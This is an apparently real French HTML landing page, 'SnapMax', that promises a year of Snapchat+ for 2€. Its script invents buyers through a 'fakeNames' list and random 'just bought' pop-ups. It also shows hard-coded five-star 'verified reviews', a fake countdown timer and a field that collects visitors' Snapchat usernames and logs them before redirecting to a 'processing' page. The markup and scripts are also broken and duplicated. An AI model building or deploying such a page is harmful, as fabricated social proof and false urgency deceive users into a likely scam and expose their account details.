<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>SnapMax — Récupère 1 an de Snap+</title>
  <link rel="icon" type="image/png" href="/logo.png?v=2" />
  <style>
    :root{
      --bg:#0b0b10;--panel:#0f1018;--panel2:#0d0e15;--line:#24283a;--text:#f7f7fb;--muted:#a3a3b2;
      --grad1:#ffd36e;--grad2:#ff79d1;--ok:#23c77d;--chip:#1a442b;--radius:18px;
    }
    *{box-sizing:border-box}
    html,body{margin:0;background:var(--bg);color:var(--text);font:16px/1.55 system-ui,-apple-system,Segoe UI,Roboto,Inter}
    a{color:#7ecbff;text-decoration:none}
    .wrap{max-width:1100px;margin:auto;padding:20px}
    .header{position:sticky;top:0;z-index:40;background:linear-gradient(180deg,#0b0b10ee,#0b0b1000);backdrop-filter:saturate(120%) blur(6px);border-bottom:1px solid #171a28}
    .row{display:flex;align-items:center;justify-content:space-between;gap:12px}
    .brand{display:flex;align-items:center;gap:10px}
    .brand span{font-weight:900;letter-spacing:.2px;background:linear-gradient(90deg,var(--grad1),var(--grad2));-webkit-background-clip:text;background-clip:text;color:transparent}
    .btn{display:inline-flex;align-items:center;gap:8px;border:1px solid #ffffff22;background:#ffffff10;color:#fff;padding:10px 14px;border-radius:12px;cursor:pointer}
    .btn:hover{background:#ffffff18}
    .hero{margin-top:18px}
    h1{margin:10px 0 6px;font-size:44px;line-height:1.15}
    .muted{color:var(--muted)}
    .kpi-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:18px 0}
    @media(max-width:980px){.kpi-grid{grid-template-columns:1fr 1fr}}
    .kpi{border:1px solid var(--line);background:var(--panel2);border-radius:16px;padding:18px;text-align:center}
    .kpi .big{font-size:26px;font-weight:900}
    .kpi .sub{font-size:12px;color:var(--muted);margin-top:6px}

    .card{border:1px solid var(--line);background:var(--panel2);border-radius:var(--radius);padding:16px}
    .buy-list{margin-top:8px;border:1px solid var(--line);background:#0f1119;border-radius:14px;overflow:hidden}
    .buy-row{display:flex;align-items:center;gap:12px;padding:12px 14px;border-top:1px solid #1b1e2a}
    .buy-row:first-child{border-top:0}
    .badge-dot{width:26px;height:26px;border-radius:50%;background:#f2a3a3;color:#000;display:flex;align-items:center;justify-content:center;font-weight:800}
    .bname{font-weight:700}
    .btime{font-size:12px;color:var(--muted)}
    .chip{margin-left:auto;font-size:12px;border:1px solid #214d33;background:#163223;color:#b3ffd6;border-radius:999px;padding:6px 10px}

    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:16px}
    @media(max-width:980px){.features{grid-template-columns:1fr}}
    .feature{border:1px solid var(--line);background:#0f1119;border-radius:14px;padding:16px}

    .reviews{margin-top:18px}
    .reviews-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
    @media(max-width:980px){.reviews-grid{grid-template-columns:1fr}}
    .rev{border:1px solid var(--line);background:#0f1119;border-radius:14px;padding:16px}
    .avatar{width:26px;height:26px;border-radius:50%;background:#222;color:#bbb;display:flex;align-items:center;justify-content:center;font-weight:800;margin-right:8px}
    .rev-row{display:flex;align-items:center;margin-bottom:10px}
    .stars{color:#ffcc66;margin-left:34px}

    .offer{margin-top:18px;border:1px solid var(--line);background:var(--panel);border-radius:16px;padding:16px}
    .count{font-size:32px;font-weight:900;letter-spacing:1px}
    .input{width:100%;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#0c0d14;color:#fff}
    .cta{margin-top:12px;background:linear-gradient(90deg,var(--grad1),var(--grad2));color:#212127;border:0;padding:14px;border-radius:14px;font-weight:900;cursor:pointer;width:100%}
    .footnote{color:var(--muted);font-size:12px;margin-top:10px}

    /* Toasts */
    .toasts{position:fixed;right:16px;bottom:16px;display:grid;gap:8px;width:min(320px,90vw);z-index:50}
    .toast{display:flex;gap:10px;align-items:center;background:#0f1712;border:1px solid #2a3b30;color:#d9ffe7;padding:10px 12px;border-radius:12px;box-shadow:0 8px 30px #0006;opacity:0;transform:translateY(10px);transition:.3s}
    .toast.show{opacity:1;transform:translateY(0)}
    .ok{width:18px;height:18px;border-radius:50%;background:var(--ok);flex:0 0 18px}
  </style>
</head>
<body>
  <!-- Header -->
  <div class="header">
    <div class="wrap row">
      <div class="brand">
        <img src="/logo.png" alt="Logo" style="height:28px;width:auto;border-radius:8px;display:block;">
        <span>SnapMax</span>
      </div>
      <a class="btn" href="#acheter">Obtenir Snap+ →</a>
    </div>
  </div>

  <main class="wrap">
    <!-- HERO -->
    <section class="hero">
      <h1>Récupère 1 an de Snap+</h1>
      <p class="muted">Design original, offre 2€, et preuves sociales dynamiques.</p>

      <!-- KPIs -->
      <div class="kpi-grid">
        <div class="kpi"><div class="big">2€</div><div class="sub">Offre limitée</div></div>
        <div class="kpi"><div class="big">+ 3 129</div><div class="sub">Récupérations</div></div>
        <div class="kpi"><div class="big">~2 min</div><div class="sub">Délai moyen</div></div>
        <div class="kpi"><div class="big">4.8/5</div><div class="sub">Satisfaction</div></div>
      </div>

      <!-- TICKER “Ils viennent d’acheter” -->
      <div class="card">
        <div class="row" style="justify-content:space-between">
          <div class="row" style="gap:10px;align-items:center">
            <div style="font-weight:800">Ils viennent d’acheter</div>
            <div class="muted" style="font-size:12px">Preuves sociales en temps réel</div>
          </div>
          <div class="chip">+ 3 129</div>
        </div>

        <div class="buy-list" id="buy-list">
          <!-- lignes ajoutées en JS -->
        </div>
      </div>

      <!-- Features -->
      <div class="features">
        <div class="feature"><h3 style="margin:0 0 8px">Activation rapide</h3><p class="muted">Accès en quelques minutes après confirmation.</p></div>
        <div class="feature"><h3 style="margin:0 0 8px">Priorité premium</h3><p class="muted">Traitement prioritaire sur certaines fonctionnalités.</p></div>
        <div class="feature"><h3 style="margin:0 0 8px">Sans engagement</h3><p class="muted">Tu arrêtes quand tu veux, en 2 clics.</p></div>
        <div class="feature"><h3 style="margin:0 0 8px">Support réactif</h3><p class="muted">Nos réponses rapides aux questions essentielles.</p></div>
        <div class="feature"><h3 style="margin:0 0 8px">Prix unique</h3><p class="muted">2€ au lieu de 47,99€ — offre limitée.</p></div>
        <div class="feature"><h3 style="margin:0 0 8px">Sécurisé</h3><p class="muted">Données traitées selon les bonnes pratiques.</p></div>
      </div>

      <!-- Avis -->
      <div class="reviews">
        <div class="row" style="justify-content:space-between;align-items:center">
          <div class="row" style="gap:10px;align-items:center">
            <img src="/logo.png" alt="" style="width:18px;height:18px;border-radius:4px;opacity:.9">
            <strong>Avis vérifiés</strong>
          </div>
          <div class="chip" style="background:#14231a;border-color:#224a31;color:#b9ffd9">4.8/5</div>
        </div>

        <div class="reviews-grid" style="margin-top:10px">
          <div class="rev">
            <div class="rev-row"><div class="avatar">M</div><div><strong>Mélanie P.</strong></div></div>
            <div class="stars">★★★★★</div>
            <p class="muted">J’ai reçu mon accès en 2 minutes, nickel 👌</p>
          </div>
          <div class="rev">
            <div class="rev-row"><div class="avatar">A</div><div><strong>Adam L.</strong></div></div>
            <div class="stars">★★★★★</div>
            <p class="muted">Simple et rapide. Rien à dire.</p>
          </div>
          <div class="rev">
            <div class="rev-row"><div class="avatar">I</div><div><strong>Inès R.</strong></div></div>
            <div class="stars">★★★★★</div>
            <p class="muted">J’étais sceptique… mais ça marche. Merci.</p>
          </div>
          <div class="rev">
            <div class="rev-row"><div class="avatar">L</div><div><strong>Lucas D.</strong></div></div>
            <div class="stars">★★★★★</div>
            <p class="muted">Support réactif, au top.</p>
          </div>
          <div class="rev">
            <div class="rev-row"><div class="avatar">N</div><div><strong>Nora Z.</strong></div></div>
            <div class="stars">★★★★★</div>
            <p class="muted">Bonne affaire pour 2€.</p>
          </div>
          <div class="rev">
            <div class="rev-row"><div class="avatar">Y</div><div><strong>Yanis G.</strong></div></div>
            <div class="stars">★★★★★</div>
            <p class="muted">Clairement le meilleur plan.</p>
          </div>
        </div>
      </div>

      <!-- Offre + Compteur + Form -->
      <div class="offer" id="acheter">
        <div class="row" style="gap:10px;align-items:center;margin-bottom:10px">
          <div style="display:flex;align-items:center;gap:8px"><span style="color:#ffae6a">⚡</span><strong>OFFRE LIMITÉE — PLUS QUE</strong></div>
        </div>
        <div class="count" id="count">00:15:00</div>
        <div style="height:1px;background:#1a1d2a;margin:12px 0"></div>
        <div class="row" style="gap:10px;align-items:center;margin:6px 0 10px">
          <div class="kpi" style="flex:0 0 auto;padding:8px 12px"><div class="big" style="font-size:20px">2€</div></div>
          <div class="muted">au lieu de 47,99€ pour 1 an complet</div>
        </div>
        <input id="snuser" class=<input id="snuser" class="input" placeholder="Nom d’utilisateur Snapchat (ex: enzo_lol)" />
        <button id="cta" class="<a id="cta" href="#" class="cta">Obtenir Snap+ maintenant 🔒</a>
        <p class="footnote">Démo non affiliée à Snap Inc. — Utilise seulement des visuels dont tu détiens les droits. <a href="/messages.html" class="muted">Voir messages</a></p>
      </div>
    </section>
  </main>

  <!-- Toasts -->
  <div class="toasts" id="toasts"></div>

  <script>
    // --- Endpoints relatifs (Vercel) ---
    const LOG_API = "/api/log";
    const MSG_API = "/api/messages"; // utilisé si tu ajoutes un aperçu ailleurs

    // Utils
    const $ = (s)=>document.querySelector(s);
    const esc=(s='')=>s.replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
    const sleep=(ms)=>new Promise(r=>setTimeout(r,ms));

    // Compte à rebours 15 min
    (function countdown(dur=15*60){
      let s=dur;
      const el=$("#count");
      function tick(){
        const m=Math.floor(s/60), ss=String(s%60).padStart(2,"0");
        el.textContent=`${String(Math.floor(m/60)).padStart(2,"0")}:${String(m%60).padStart(2,"0")}:${ss}`;
        if(s>0){ s--; setTimeout(tick,1000); }
      }
      tick();
    })();

    // Logs
    async function sendLog(evt){
      const r = await fetch(LOG_API,{
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify({ ...evt, path: location.pathname })
      });
      const j = await r.json().catch(()=>({}));
      if(!r.ok || j.ok===false) throw new Error(j.error||("HTTP "+r.status));
      return j;
    }

    // CTA
    $("#cta").addEventListener("click", async ()=>{
      const u = ($("#snuser")?.value||"").trim();
      if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }
      try{
        await sendLog({ event_type:"checkout_start", user_name:u });
        showToast(`@${u} vient de lancer l'achat`);
      }catch(e){
        alert("Échec de l’envoi. Réessaie.");
        console.warn(e);
      }
    });

    // Liste “Ils viennent d’acheter”
    const starters = [
      {name:"maria_e", ago:"il y a 8m"},
      {name:"emma-k", ago:"il y a 10m"},
      {name:"kylianx", ago:"il y a 12m"},
      {name:"enzo_lol", ago:"il y a 10s"},
    ];
    const buyList = $("#buy-list");
    function row(name,ago){
      const initial = esc(name[0]||"?").toUpperCase();
      return `
        <div class="buy-row">
          <div class="badge-dot">${initial}</div>
          <div>
            <div class="bname">${esc(name)}</div>
            <div class="btime">${esc(ago)}</div>
          </div>
          <div class="chip">✓ Snap+</div>
        </div>`;
    }
    function renderList(){
      buyList.innerHTML = starters.map(x=>row(x.name,x.ago)).join("");
    }
    renderList();

    // Toasts bas droite (achats aléatoires)
    const fakeNames = ["enzo_lol","mila_snap","axel.93","nora_dev","yanisx","lea__","momo.z","clara_t","imad75","sarah_2"];
    const toasts = $("#toasts");
    function showToast(text){
      const el=document.createElement("div");
      el.className="toast";
      el.innerHTML=`<div class="ok"></div><div>${esc(text)}</div>`;
      toasts.appendChild(el);
      requestAnimationFrame(()=>el.classList.add("show"));
      setTimeout(()=>{el.classList.remove("show"); setTimeout(()=>el.remove(),300);}, 4000);
    }
    (async function loopToasts(){
      while(true){
        await sleep(6000 + Math.random()*6000);
        const name = fakeNames[Math.floor(Math.random()*fakeNames.length)];
        showToast(`@${name} vient d'acheter 1 an Snap+`);
      }
    })();
  </script>
  <script>
  // Endpoints locaux
  const LOG_API = "/api/log";

  async function sendLog(evt){
    try{
      const r = await fetch(LOG_API,{
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify({ ...evt, path: location.pathname })
      });
      await r.json().catch(()=>({}));
    }catch(e){ /* on ignore l'erreur, on redirige quand même */ }
  }

  // === REDIRECTION CTA ===
  (function attachCTA(){
    const btn = document.getElementById("cta") || document.getElementById("acheter");
    if(!btn) return;

    btn.addEventListener("click", async (e)=>{
      e.preventDefault();
      const u = (document.getElementById("snuser")?.value || "").trim();
      if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }

      // 1) on log l'événement (non bloquant)
      await sendLog({ event_type:"checkout_start", user_name:u });

      // 2) on redirige vers la page de traitement
      const next = "/process.html?u=" + encodeURIComponent(u);
      window.location.href = next;
    });
  })();
</script>
  <script>
  // Endpoint (facultatif, pour logger l’événement côté serveur)
  const LOG_API = "/api/log";

  async function sendLog(evt){
    try{
      const r = await fetch(LOG_API, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({ ...evt, path: location.pathname })
      });
      await r.json().catch(()=>({}));
    } catch(e) { /* on ignore les erreurs, on redirige quand même */ }
  }

  (function attachCTA(){
    const btn = document.getElementById("cta");
    if (!btn) return; // sécurité

    btn.addEventListener("click", async (e)=>{
      e.preventDefault();
      const u = (document.getElementById("snuser")?.value || "").trim();
      if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }

      // 1) log (non bloquant)
      await sendLog({ event_type: "checkout_start", user_name: u });

      // 2) redirection vers la page “analyse”
      window.location.href = "/process.html?u=" + encodeURIComponent(u);
    });
  })();
</script>
</body>
</html>
